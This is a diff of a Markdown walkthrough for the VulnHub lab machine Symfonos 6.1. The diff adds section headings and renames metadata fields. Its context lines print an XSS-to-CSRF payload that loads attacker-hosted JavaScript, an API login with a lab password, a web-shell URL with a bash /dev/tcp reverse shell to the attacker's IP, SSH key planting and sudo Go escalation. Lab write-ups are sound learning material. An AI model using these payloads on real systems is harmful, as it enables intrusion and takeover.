@@ -11,21 +11,21 @@ tags:
   - reverse-shell
   - sudo
   - go
-machine: Symfonos 6.1
+machine: Symfonos
 platform: Linux
 difficulty: Intermediate/Hard
-date_solved: 2026-09-23
-key_techniques:
+date: 2026-09-23
+techniques:
   - SSH user enumeration
   - CSRF
   - Gitea credential reuse
   - Reverse shell
   - Sudo privilege escalation through Go
 cve: []
-initial_vector: Web services and Gitea enumeration
-privilege_escalation: Sudo Go execution to set the SUID bit on bash
+initial vector: Web services and Gitea enumeration
+privilege escalation: Sudo Go execution to set the SUID bit on bash
 author: null
-writeup_url: https://www.vulnhub.com/entry/symfonos-61,458/
+source: https://www.vulnhub.com/entry/symfonos-61,458/
 ---
 
 - **Symfonos 6.1 machine**: [https://www.vulnhub.com/entry/symfonos-61,458/](https://www.vulnhub.com/entry/symfonos-61,458/)
@@ -76,6 +76,9 @@ gobuster dir -u http://192.168.18.238/ -w /usr/share/seclists/Discovery/Web-Cont
 We find another directory, */flyspray*; searching it in searchsploit returns several vulnerabilities, but we don't know the version. Flyspray is open source, so we can browse the whole project on GitHub to find where files like *changelog.txt* live, and at http://192.168.18.238/flyspray/docs/UPGRADING.txt we find version 1.0.
 and in searchsploit a CSRF for that same version.
 
+## Exploitation
+
+### Flyspray CSRF to create an admin
 To run the exploit we need to create a user and log in; in the realname field, as a test, we can put *"><script>alert("XSS")</script>* and see that it works, so we force it to load an external resource and execute JavaScript. ("><script src="http://192.168.18.226/pwned.js"</script>) and this is the script:
 ```java
 var tok = document.getElementsByName('csrftoken')[0].value;
@@ -108,6 +111,7 @@ He has credentials exposed in */symfonos-blog*, but for the MariaDB SQL, besides
 
 Poking around his projects we can view *index.php* in raw, with a *preg_replace* using the *e* modifier, which is no longer supported because you can inject PHP code into the corresponding string.
 
+### Gitea credential reuse and API RCE
 There is another project called *symfonos-api* that looks like the API running on port 5000. After trying several things, from the project content we figure out that we can send a curl to the API with the Achilles credentials we have.
 ```bash
 curl -s -X POST "http://192.168.18.238:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}' | jq
@@ -131,6 +135,7 @@ What we have in this command is:
 ```bash
 base64 -w 0 data; echo
 ```
+### Reverse shell
 Since this command creates a *cmd.php* file and gives us remote command execution, we start a netcat listener on 443 from the attacker machine and send ourselves a shell through the URL.
 ```url
 http://192.168.18.238/posts/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
@@ -148,6 +153,7 @@ export SHELL=bash
 stty rows 44 columns 184
 
 ```
+### Stabilising access over SSH
 We're inside the machine; all that's left is to escalate privileges, but now that we're in we can use the SSH service. We connect as the Achilles user with the earlier password. First we delete old SSH keys on the attacker machine, then create new SSH keys and swap them on the victim.
 
 ```bash
@@ -163,6 +169,8 @@ chmod 600 authorized_keys
 ```
 
 And we connect over SSH as achilles with *ssh achilles@192.168.18.238* — it's important to type *yes*.
+
+## Privilege escalation
 We run *sudo -l* and find a NOPASSWD entry for Go. We'll create a .go file to give ourselves a shell:
 ```Go
 package main
